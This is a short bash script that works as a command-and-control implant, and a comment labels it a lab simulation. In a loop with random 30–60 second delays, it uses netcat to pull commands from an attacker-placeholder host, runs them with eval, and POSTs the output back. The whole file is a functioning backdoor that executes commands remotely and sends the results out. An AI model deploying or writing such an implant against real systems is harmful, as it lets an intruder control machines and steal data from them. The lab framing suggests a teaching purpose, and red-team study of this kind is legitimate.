#!/bin/bash
SERVER_IP="<attacker_IP>"       # Added attacker IP address here in lab simulation
PORT=8000
LOG="/tmp/agent_nc.log"
NC=$(which nc 2>/dev/null || true)
NC=${NC:-nc}              # fallback to 'nc' if which didn't find it

while true; do
    echo "[*] Connecting to $SERVER_IP:$PORT to pull command..." >> "$LOG"

    # GET command (to send HTTP-like request, and to read full response)
    printf "GET /commands.txt HTTP/1.1\r\nHost: %s\r\n\r\n" "$SERVER_IP" | $NC "$SERVER_IP" "$PORT" > /tmp/response.txt 2>>"$LOG" || true

    # Remove HTTP headers (to skip until first blank line) and remove CRs
    cmd=$(awk 'NR>1 && $0=="" {for(i=NR+1;i<=NR+10000;i++) {print; getline} exit} {print}' /tmp/response.txt | sed '1,/^\s*$/d' | tr -d '\r' )
    # simpler fallback: strip headers
    cmd=$(awk 'NR>3 {print}' /tmp/response.txt | tr -d '\r')

    echo "[*] Command received: $cmd" >> "$LOG"

    if [ -n "$cmd" ]; then
        # to run command and capture stdout+stderr
        result=$(eval "$cmd" 2>&1)
        echo "[*] Result: $result" >> "$LOG"

        # to calculate byte length of result (robust)
        result_bytes=$(printf '%s' "$result" | wc -c)
        # now to send POST
        printf "POST /results.txt HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s" "$SERVER_IP" "$result_bytes" "$result" | $NC "$SERVER_IP" "$PORT" 2>>"$LOG" || true
        echo "[*] POST sent." >> "$LOG"
    else
        echo "[*] No command received." >> "$LOG"
    fi

    sleep $((RANDOM % 30 + 30))
done
